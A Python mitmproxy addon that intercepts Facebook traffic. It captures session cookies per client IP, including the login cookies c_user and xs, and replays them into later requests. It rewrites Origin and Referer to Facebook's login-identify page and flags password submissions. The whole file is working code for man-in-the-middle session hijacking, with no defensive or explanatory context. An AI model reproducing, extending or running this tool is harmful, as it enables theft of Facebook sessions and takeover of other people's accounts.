import re
import time
from http.cookies import SimpleCookie
from collections import defaultdict
from mitmproxy import ctx

CRITICAL_COOKIES = {"datr", "sb", "fr", "wd", "spin", "c_user", "xs", "presence", "sfiu", "locale"}


def _now():
    return time.strftime("%H:%M:%S")


def _log(msg: str):
    ctx.log.info(f"[{_now()}] [FBSESS] {msg}")


class FacebookSessionAddon:
    """Captures FB Set-Cookie and replays them per client IP; fixes Origin/Referer."""

    def __init__(self):
        # client_ip -> {cookie_name: value}
        self.jar = defaultdict(dict)

    def _client_ip(self, flow):
        try:
            return flow.client_conn.address[0]
        except Exception:
            return "unknown"

    def _is_facebook(self, host: str) -> bool:
        return host.endswith("facebook.com") or host.endswith("fb.com")

    def _merge_cookies(self, existing: str, injected: dict) -> str:
        # existing header into dict
        merged = {}
        if existing:
            sc = SimpleCookie()
            sc.load(existing)
            for k, morsel in sc.items():
                merged[k] = morsel.value
        merged.update(injected)
        return "; ".join([f"{k}={v}" for k, v in merged.items()])

    def response(self, flow):
        host = flow.request.host
        if not self._is_facebook(host):
            return
        client_ip = self._client_ip(flow)
        set_cookies = flow.response.headers.get_all("Set-Cookie") if hasattr(flow.response.headers, "get_all") else [v for (k, v) in flow.response.headers.items(multi=True) if k.lower() == "set-cookie"]
        if not set_cookies:
            return
        captured = []
        for raw in set_cookies:
            sc = SimpleCookie()
            try:
                sc.load(raw)
            except Exception:
                continue
            for name, morsel in sc.items():
                value = morsel.value
                self.jar[client_ip][name] = value
                if name in CRITICAL_COOKIES:
                    captured.append(f"{name}={value[:12]}…")
        if captured:
            _log(f"captured {len(captured)} cookie(s) from {host} ip={client_ip}: {captured}")

    def request(self, flow):
        host = flow.request.host
        if not self._is_facebook(host):
            return
        client_ip = self._client_ip(flow)

        # inject cookies
        stored = self.jar.get(client_ip, {})
        if stored:
            current = flow.request.headers.get("Cookie", "")
            merged = self._merge_cookies(current, stored)
            flow.request.headers["Cookie"] = merged

        # rewrite Origin/Referer to FB
        flow.request.headers["Origin"] = "https://m.facebook.com"
        flow.request.headers["Referer"] = "https://m.facebook.com/login/identify"

        # flag password submit
        if "send_login_request" in flow.request.pretty_url:
            _log(f"password POST detected ip={client_ip} cookies={len(stored)}")


def load(l):
    l.addaddon(FacebookSessionAddon())
